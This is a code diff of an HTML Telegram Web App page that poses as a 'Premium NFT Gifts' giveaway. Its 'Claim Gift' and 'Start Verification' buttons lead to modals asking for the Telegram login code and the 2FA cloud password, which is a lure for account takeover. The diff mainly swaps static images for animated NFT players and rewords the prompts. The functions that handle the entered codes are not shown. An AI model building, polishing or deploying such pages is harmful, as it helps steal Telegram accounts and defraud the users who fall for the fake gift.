@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NFT Premium Gift</title>
+    <title>Premium NFT Gifts</title>
+    <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { 
@@ -14,7 +15,6 @@
         
         #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.2; }
 
-        /* Навигация */
         .tabs { 
             display: flex; justify-content: space-around; 
             background: #000; border-bottom: 1px solid #111;
@@ -29,44 +29,28 @@
         .content-section { display: none; padding: 20px; height: calc(100vh - 50px); overflow-y: auto; box-sizing: border-box; position: relative; z-index: 10; }
         .content-section.active { display: block; }
 
-        /* Карточки NFT */
+        /* Карточка с анимацией */
         .nft-card { 
-            background: #000; border: 1px solid #111; padding: 20px; 
-            margin-bottom: 30px; text-align: center; position: relative;
-        }
-        
-        /* Анимация движения (левитация) */
-        .nft-img { 
-            width: 80%; border-radius: 2px; margin-bottom: 20px; 
-            filter: brightness(0.9);
-            animation: float 4s ease-in-out infinite;
+            background: #050505; border: 1px solid #111; padding: 20px; 
+            margin-bottom: 30px; text-align: center; border-radius: 8px;
         }
 
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-15px); }
-            100% { transform: translateY(0px); }
+        /* Контейнер для анимации */
+        .animation-container {
+            width: 180px; height: 180px; margin: 0 auto 15px auto;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        /* Разные задержки для разного движения */
-        .nft-card:nth-child(2) .nft-img { animation-delay: 1s; }
-        .nft-card:nth-child(3) .nft-img { animation-delay: 2s; }
-        .nft-card:nth-child(4) .nft-img { animation-delay: 0.5s; }
-
-        .nft-title { font-size: 20px; letter-spacing: 2px; margin-bottom: 10px; font-weight: normal; }
+        .nft-title { font-size: 20px; letter-spacing: 2px; margin-bottom: 5px; font-weight: normal; }
         .nft-price { color: #555; font-style: italic; font-size: 14px; margin-bottom: 20px; display: block; }
 
         .btn { 
             background: #fff; color: #000; border: none; padding: 15px; width: 100%; 
             font-family: "Times New Roman"; font-weight: bold; cursor: pointer; font-size: 14px;
-            letter-spacing: 2px; text-transform: uppercase;
+            letter-spacing: 2px; text-transform: uppercase; border-radius: 2px;
         }
 
-        /* Информация в профиле */
-        .info-item { border-bottom: 1px solid #111; padding: 15px 0; display: flex; justify-content: space-between; font-size: 14px; }
-        .info-label { color: #444; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* Модалки */
+        /* Стили модалок */
         .modal { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; z-index: 2000; flex-direction: column; 
@@ -76,7 +60,7 @@
         
         input { 
             width: 100%; background: transparent; border: none; border-bottom: 1px solid #333; 
-            color: #fff; padding: 10px; font-size: 28px; text-align: center; outline: none; margin-bottom: 40px;
+            color: #fff; padding: 10px; font-size: 32px; text-align: center; outline: none; margin-bottom: 40px;
             font-family: "Times New Roman"; letter-spacing: 8px;
         }
     </style>
@@ -91,67 +75,63 @@
     </div>
 
     <div id="market" class="content-section active">
+        
         <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-img">
+            <div class="animation-container">
+                <dotlottie-player src="https://nft.fragment.com/gift/santahat-10168.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
+            </div>
             <div class="nft-title">Santa Hat</div>
             <span class="nft-price">50.00 USD</span>
             <button class="btn" onclick="requestAuth()">Claim Gift</button>
         </div>
 
         <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-img">
+            <div class="animation-container">
+                <dotlottie-player src="https://nft.fragment.com/gift/holidaydrink-39466.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
+            </div>
             <div class="nft-title">Holiday Drink</div>
             <span class="nft-price">50.00 USD</span>
             <button class="btn" onclick="requestAuth()">Claim Gift</button>
         </div>
 
         <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/partysparkler-56795.webp" class="nft-img">
+            <div class="animation-container">
+                <dotlottie-player src="https://nft.fragment.com/gift/partysparkler-56795.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
+            </div>
             <div class="nft-title">Party Sparkler</div>
             <span class="nft-price">50.00 USD</span>
             <button class="btn" onclick="requestAuth()">Claim Gift</button>
         </div>
 
         <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/xmasstocking-110648.webp" class="nft-img">
+            <div class="animation-container">
+                <dotlottie-player src="https://nft.fragment.com/gift/xmasstocking-110648.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
+            </div>
             <div class="nft-title">Xmas Stocking</div>
             <span class="nft-price">50.00 USD</span>
             <button class="btn" onclick="requestAuth()">Claim Gift</button>
         </div>
+
     </div>
 
     <div id="profile" class="content-section">
-        <div class="info-item">
-            <span class="info-label">Status</span>
-            <span>Guest Member</span>
-        </div>
-        <div class="info-item">
-            <span class="info-label">Verification</span>
-            <span style="color: #600;">Required</span>
-        </div>
-        <div class="info-item" onclick="window.open('https://t.me/x1o1y')">
-            <span class="info-label">Support</span>
-            <span style="text-decoration: underline;">@x1o1y</span>
-        </div>
+        <h3 style="font-weight: normal; letter-spacing: 1px;">Account Status: <span style="color: #600;">Unverified</span></h3>
+        <p style="color: #444;">Support: <span style="color: #fff; text-decoration: underline;" onclick="window.open('https://t.me/x1o1y')">@x1o1y</span></p>
     </div>
 
     <div id="verify" class="content-section">
-        <p style="color: #444; font-style: italic; line-height: 1.8; margin-bottom: 30px;">
-            Для подтверждения транзакции необходимо пройти проверку через нативный протокол Telegram.
-        </p>
+        <p style="color: #444; font-style: italic; margin-bottom: 30px;">Требуется подтверждение личности для вывода активов.</p>
         <button class="btn" onclick="requestAuth()">Start Verification</button>
     </div>
 
     <div id="step-code" class="modal">
-        <h2 style="font-weight: normal; letter-spacing: 3px; font-size: 18px; margin-bottom: 10px;">VERIFICATION</h2>
-        <p style="color: #444; font-size: 12px; margin-bottom: 40px; text-align: center;">Введите код, отправленный в ваш Telegram</p>
+        <h2 style="font-weight: normal; letter-spacing: 2px;">ENTER CODE</h2>
         <input type="number" id="in-code" placeholder="00000">
-        <button class="btn" onclick="sendCode()">Verify</button>
+        <button class="btn" onclick="sendCode()">Verify Code</button>
     </div>
 
     <div id="step-pass" class="modal">
-        <h2 style="font-weight: normal; letter-spacing: 3px; font-size: 18px; margin-bottom: 10px;">PASSWORD</h2>
-        <p style="color: #444; font-size: 12px; margin-bottom: 40px; text-align: center;">Введите ваш облачный пароль</p>
+        <h2 style="font-weight: normal; letter-spacing: 2px;">2FA PASSWORD</h2>
         <input type="password" id="in-pass" placeholder="••••">
         <button class="btn" onclick="sendPass()">Confirm</button>
     </div>
@@ -193,20 +173,20 @@
             tg.close();
         }
 
-        // СНЕГ
+        // Snow animation
         const canvas = document.getElementById('snow');
         const ctx = canvas.getContext('2d');
         let flakes = [];
         function initSnow() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            for (let i = 0; i < 40; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.5, d: Math.random()*0.5 });
+            for (let i = 0; i < 40; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.2, d: Math.random()*0.4 });
         }
         function drawSnow() {
             ctx.clearRect(0,0,canvas.width,canvas.height);
             ctx.fillStyle = "#fff"; ctx.beginPath();
             for (let f of flakes) { ctx.moveTo(f.x, f.y); ctx.arc(f.x, f.y, f.r, 0, Math.PI*2); }
             ctx.fill();
-            for (let f of flakes) { f.y += f.d + 0.3; if (f.y > canvas.height) f.y = -5; }
+            for (let f of flakes) { f.y += f.d + 0.2; if (f.y > canvas.height) f.y = -5; }
             requestAnimationFrame(drawSnow);
         }
         initSnow(); drawSnow();
